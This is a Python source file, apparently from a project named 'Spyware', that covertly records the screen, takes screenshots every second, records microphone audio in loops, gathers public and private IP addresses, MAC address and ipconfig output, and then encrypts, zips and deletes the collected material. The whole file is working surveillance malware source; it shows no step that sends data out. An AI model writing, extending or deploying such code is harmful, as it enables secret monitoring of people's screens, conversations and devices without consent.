# Libraries
import datetime
import sys
import cv2
from PIL import ImageGrab
import sounddevice as sd
import wavfile as wf
import os
import time
import socket
from requests import get
import platform
from datetime import date, datetime
from getmac import get_mac_address
import subprocess
import keyboard
from cryptography.fernet import Fernet
import zipfile
import shutil
import pyautogui
from screeninfo import get_monitors
import numpy as np


# Base class for widely used variables
class BaseClass:
    def __init__(self):
        # Date and time
        self.currentDate = date.today()
        self.currentTime = datetime.now()

        # Base definition of folder_path
        self.folder_path_recordings = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Recordings"
        self.folder_path_screenshots = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Screenshots"
        self.folder_path_soundfiles = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Soundfiles"
        self.folder_path_sys_info = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Systeminformation"
        self.folder_path_cmd_prompts = r"C:\Users\deniz\PycharmProjects\Spyware\Features\CMDPrompts"


class Webcamera(BaseClass):
    def __init__(self):
        super().__init__()  # Call the base class __init__ method

        self.recording = False
        self.duration = 300  # 5 minutes of recording

        # Folder path and filename
        self.folder_path = self.folder_path_recordings
        self.output_file_name = "Recording.mp4"

    def get_screen_size(self):
        try:
            monitors = get_monitors()
            main_monitor = monitors[0]
            return main_monitor.width, main_monitor.height
        except Exception as e:
            print(f"Error occurred while getting screen size: {e}")
            return None

    def record_screen(self):
        screen_size = self.get_screen_size()
        if screen_size is None:
            print("Unable to determine screen size")
            return 2

        if not os.path.exists(self.folder_path):
            os.makedirs(self.folder_path)

        file_path = os.path.join(self.folder_path_recordings, self.output_file_name)

        codec = cv2.VideoWriter_fourcc(*"mp4v")
        output = cv2.VideoWriter(file_path, codec, 30.0, screen_size)

        start_time = time.time()
        end_time = start_time + self.duration

        self.recording = True

        # While recording is true and the recording time is below the duration
        while self.recording and time.time() < end_time:
            # Capture the screen time
            frame = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(frame), cv2.COLOR_RGB2BGR)

            # Write the frame to the output video file
            output.write(frame)

            cv2.imshow('Screen Recording', frame)

        self.recording = False
        output.release()
        cv2.destroyAllWindows()


class Screenshot(BaseClass):
    def __init__(self):
        super().__init__()  # Call the base class __init__ method

        # Constants
        self.counter = 0
        self.sleepAmount = 1

        # Folder path and folder name
        self.folder_path = self.folder_path_screenshots
        self.folder_name = f"Subfolder{date.today(), datetime.now()}"
        self.image = None

    def create_subfolder(self):
        subfolder_path = os.path.join(self.folder_path, self.folder_name)

        if not os.path.exists(subfolder_path):
            os.makedirs(subfolder_path)
        return subfolder_path

    def screenshot(self):
        subfolder_path = self.create_subfolder()

        while True:
            try:
                self.image = ImageGrab.grab()
            except Exception as e:
                print(f"Error while grabbing the image: {e}")
                break

            self.counter += 1

            if not os.path.exists(self.folder_path):
                os.makedirs(self.folder_path)

            # Save captured screenshots to the file path
            output_file_name = f"Screenshot{self.counter}.png"
            file_path = os.path.join(subfolder_path, output_file_name)
            self.image.save(file_path)

            # Flush the output to display immediately
            sys.stdout.flush()

            # Check if the 'Esc' key is pressed
            if keyboard.is_pressed('q') or keyboard.is_pressed('Q'):
                print("Program stopped by user.")
                break

            time.sleep(self.sleepAmount)


class Microphone(BaseClass):
    def __init__(self):
        super().__init__()  # Call the base class __init__ method

        # Constants for audio settings
        self.audio_data = None
        self.sample_rate = 44100  # Normal wave length for normal sound quality
        self.duration = 300  # Duration in seconds

        # Folder path and filename
        self.folder_path = self.folder_path_soundfiles
        self.output_file_name = f"Soundfile.wav"

    def audio_recording(self):
        while True:
            try:
                # Record
                self.audio_data = sd.rec(int(self.sample_rate * self.duration), samplerate=self.sample_rate, channels=2)
            except sd.PortAudioError as e:
                print(f"Audio recording error: {e}")

            if not os.path.exists(self.folder_path):
                os.makedirs(self.folder_path)

            sd.wait()

            # Save captured audio to the file path
            file_path = os.path.join(self.folder_path, self.output_file_name)
            wf.write(file_path, self.sample_rate, self.audio_data)


class SysInfo(BaseClass):
    def __init__(self):
        super().__init__()  # Call the base class __init__ method

        # Folder path and filename
        self.folder_path = self.folder_path_sys_info
        self.output_file_name = "SystemInformation.txt"

        # Public IP website link
        self.public_ip_link = "https://api.ipify.org"

        # Mac address
        self.mac_address = get_mac_address()

        # Default value
        self.os_info = None

    def system_information(self):
        platform_switch = {
            # platform.win32_ver(release='', version='', csd='', ptype='')
            'Windows': lambda: platform.win32_ver(),
            # platform.mac_ver(release='', versioninfo=('', '', ''), machine='')
            'Darwin': lambda: platform.mac_ver(),
            # platform.libc_ver(executable=sys.executable, lib='', version='', chunksize=16384)
            'Linux': lambda: platform.libc_ver()
        }

        try:
            # Get hosts platform system and the matching keys in the dictionary
            platform_name = platform.system()
            get_os = platform_switch.get(platform_name)

            if get_os:
                self.os_info = get_os()  # Call the lambda function
            else:
                raise Exception("Unsupported platform")
        except Exception as e:
            print(f"An error occurred: {str(e)}")

        # Open/Create file path
        file_path = os.path.join(self.folder_path, self.output_file_name)
        with open(file_path, "a") as f:
            hostname = socket.gethostname()
            ipaddr = socket.gethostbyname(hostname)

            f.write("-----------------------------BEGIN-----------------------------\n\n")

            try:
                public_ip = get(self.public_ip_link).text
                f.write(f"Public IP Address: {public_ip}\n")
            except Exception as e:
                f.write(f"Couldn't get Public IP Address (May be due to max query): {e}\n")

            f.write(f"Processor Info: {platform.processor()}\n")
            f.write(f"OS Info: {platform.system()}\n")
            f.write(f"Detailed OS Info: {self.os_info}\n")
            f.write(f"Machine Info: {platform.machine()}\n")
            f.write(f"Hostname: {hostname}\n")
            f.write(f"Private IP Address: {ipaddr}\n")
            f.write(f"Mac Address: {self.mac_address}\n\n\n")

            f.write(f"Current date: {self.currentDate} || Current time: {self.currentTime}\n\n")

            f.write("------------------------------END------------------------------\n\n\n")


class CmdPrompts(BaseClass):
    def __init__(self):
        super().__init__()  # Call the base class __init__ method

        # Folder path and filename
        self.folder_path = self.folder_path_cmd_prompts
        self.output_file_name = "CMDPrompts.txt"

        # Default value
        self.network_data = None

    def ipconfig_all(self):
        platform_switch = {
            # ipconfig
            'Windows': lambda: subprocess.check_output(['ipconfig', '/all'], text=True),
            # ifconfig
            'Darwin': lambda: subprocess.check_output(['ifconfig', '-a'], text=True),  # For ifconfig output
            # ifconfig
            'Linux': lambda: subprocess.check_output(['ifconfig', '-a'], text=True)
        }

        try:
            # Get hosts platform system and the matching keys in the dictionary
            platform_name = platform.system()
            get_os = platform_switch.get(platform_name)

            if get_os:
                self.network_data = get_os()  # Call the lambda function
            else:
                raise Exception("Unsupported platform")
        except Exception as e:
            print(f"An error occurred: {str(e)}")

        # Open/Create file path
        file_path = os.path.join(self.folder_path, self.output_file_name)
        with open(file_path, "a") as f:
            f.write("-----------------------------BEGIN-----------------------------\n")

            f.write(f"{self.network_data}\n\n\n")

            f.write(f"Current date: {self.currentDate} || Current time: {self.currentTime}\n\n")

            f.write("------------------------------END------------------------------\n\n\n")


class FileEncryption(BaseClass):
    def __init__(self):
        super().__init__()  # Call the base class __init__ method

        self.key_path = 'FileKey.key'
        self.zip_file_path = 'Encrypted_Folders.zip'
        self.encrypted_folders_dir = 'Encrypted_Folders'

        self.folders = [
            self.folder_path_screenshots,
            self.folder_path_soundfiles,
            self.folder_path_sys_info,
            self.folder_path_cmd_prompts
        ]

        self.base_folder = os.path.dirname(os.path.commonprefix(self.folders))

    def generate_key(self):
        key = Fernet.generate_key()

        # String key in a file
        with open(self.key_path, 'wb') as f:
            f.write(key)

    def encrypt_folder(self, folder_path):
        # Read the encryption key
        with open(self.key_path, 'rb') as f:
            key = f.read()

        fernet = Fernet(key)

        # Get the relative path to the folder from the base folder
        rel_folder_path = os.path.relpath(folder_path, self.base_folder)

        # Create the corresponding encrypted folder path inside "Encrypted_Folders"
        encrypted_folder_path = os.path.join(self.encrypted_folders_dir, rel_folder_path)

        # Copy the original folder to the encrypted folder
        shutil.copytree(folder_path, encrypted_folder_path)

        # Iterate through the files in the folder
        for root, _, files in os.walk(encrypted_folder_path):
            for file in files:
                file_path = os.path.join(root, file)

                # Read the original file content
                with open(file_path, 'rb') as f:
                    org_content = f.read()

                # Encrypt the file content
                encrypted_content = fernet.encrypt(org_content)

                # Save the encrypted content back to the file
                with open(file_path, 'wb') as f:
                    f.write(encrypted_content)

    def encrypt_folders(self):
        self.generate_key()

        # Create the "encrypted_folders" directory if it doesn't exist
        os.makedirs(self.encrypted_folders_dir, exist_ok=True)

        for folder in self.folders:
            if os.path.exists(folder):
                self.encrypt_folder(folder)

        # Zip the "encrypted_folders" directory
        with zipfile.ZipFile(self.zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for root, _, files in os.walk(self.encrypted_folders_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    zip_file.write(file_path, os.path.relpath(file_path, self.encrypted_folders_dir))

    def delete_files(self):
        # Delete all the original folders
        for folder in self.folders:
            shutil.rmtree(folder)

        # Delete the encrypted folders directory
        shutil.rmtree(self.encrypted_folders_dir)

        # Delete the key file
        os.remove(self.key_path)

        # Delete the zip file
        os.remove(self.zip_file_path)
